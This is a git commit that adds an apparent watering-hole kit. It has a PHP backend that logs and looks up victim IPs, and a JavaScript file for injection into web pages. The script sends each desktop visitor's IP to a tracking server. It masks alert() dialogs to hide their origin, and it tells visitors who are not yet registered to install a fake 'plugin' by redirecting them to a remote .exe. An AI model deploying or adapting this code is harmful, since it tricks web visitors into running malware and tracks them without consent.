c2d88dbebc29ec498e5d9d72aeb1700dbdb8a3e2
TimWhite <36320909+timwhitez@users.noreply.github.com>
2020-07-16 14:35:41 +0800

    Add files via upload

---
+++ bobo.php
@@ -0,0 +1,37 @@
+<?php
+
+$db = "botIPs.txt";
+
+if(isset($_GET['ip'])){
+	$botIP = @$_GET['ip'];
+	$line = file_get_contents($db);
+	$botIPs = explode("\n", $line);
+	if (@in_array(base64_encode($botIP), $botIPs)) {
+		echo "ip exist";
+	}else {
+		$bots = fopen($db, "a") or die("Unable to open bots file!");
+		fwrite($bots, base64_encode($botIP) . "\n");
+		fclose($bots);
+	}
+}
+
+
+if(isset($_GET['search'])){
+
+	$ip = @$_GET['search'];
+
+	if (file_exists($db)) {
+		$line = file_get_contents($db);
+		$botIPs = explode("\n", $line);
+		if (@in_array($ip, $botIPs)) {
+			header('Content-type: application/json');
+			header('Access-Control-Allow-Origin: *');
+			echo "in";
+		}else {
+			header('Content-type: application/json');
+			header('Access-Control-Allow-Origin: *');
+			echo "bobo";
+	}
+	}
+}
+?>
---
+++ test.js
@@ -0,0 +1,57 @@
+document.write("<script src='http://pv.sohu.com/cityjson?ie=utf-8'></script>");
+
+//重写alert来源显示
+window.alert = function(name){
+var iframe = document.createElement("IFRAME");
+iframe.style.display="none";
+iframe.setAttribute("src", 'data:text/plain,');
+document.documentElement.appendChild(iframe);
+window.frames[0].window.alert(name);
+iframe.parentNode.removeChild(iframe);
+}
+
+//上线检测
+function isRise(ip) {
+    var xmlHttp;
+    if (window.XMLHttpRequest) {
+        xmlHttp = new XMLHttpRequest();
+    } else {
+        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
+    }
+    xmlHttp.open("GET", "http://www.xxx.com/bobo.php?search="+ip, "true");
+    xmlHttp.send();
+    xmlHttp.onreadystatechange = function() {
+		//alert(xmlHttp.responseText)
+        if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
+            var resData = xmlHttp.responseText;
+            if (resData == "in") {
+            } else {
+                download();
+            }
+        }
+    }
+}
+
+//下载
+function download(){
+    alert("请尝试下载并安装插件后访问本页面!");
+    window.location.href="http://www.zzz.com/xxx.exe";
+}
+
+//判断是否是PC
+function isPc() {
+    if (navigator.userAgent.match(/(iPhone|Android)/i)) {
+        return false;
+    } else {
+        return true;
+    }
+}
+
+//load,ipbase64编码后,传递给后端
+window.onload = function(){
+    if(!isPc()){
+        alert("当前页面只能在电脑PC端中加载,请稍后重试...");
+    }else{
+        isRise(btoa(returnCitySN["cip"]));
+    }
+}
